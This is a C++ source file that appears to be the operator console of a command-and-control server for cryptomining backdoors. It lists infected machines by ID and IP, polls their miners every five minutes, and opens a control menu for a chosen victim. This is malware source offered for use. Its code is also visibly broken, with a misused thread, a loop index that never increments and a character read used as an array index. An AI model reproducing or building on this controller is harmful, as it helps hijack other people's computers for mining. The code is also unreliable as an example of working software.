#include <iostream>
#include<pthread.h>
#include<thread>
#include "communication.h"
#include "backdoor.h"
#define IP "127.0.0.1"
#define PORT 8000


class Server{
public:

    /*
        This function will check what miners are online and howmany are working
    */
    void check_miners(){
        while(true){
            for (Backdoor b : backdoors){
                b.get_miner_info();
            }
            sleep(300); // sleep for 5 min
        }
    }

    void operate(){
        int i = 0;
        std::cout << "Choose Miner: " << std::endl;
        for (Backdoor b : backdoors){

            std::cout << i << " - " << b.get_miner_id() << " - ";
            std::cout << b.get_miner_ip() << std::endl;
        }
        int choice = std::cin.get();
        Backdoor nova = backdoors[choice];

        nova.menu();
    }
    
    
    Server(Communication *c){
        this->c = c;
        backdoors = this->c->get_backdoors();
        std::thread check_minining(check_miners);
        check_minining.join();
    }

private:
    Communication *c;
    std::vector<Backdoor>backdoors;
};



int main(int argc, char *argv[]){

    Communication *c = new Communication(IP, PORT);
    Server *s = new Server(c);

    s->operate();
    
}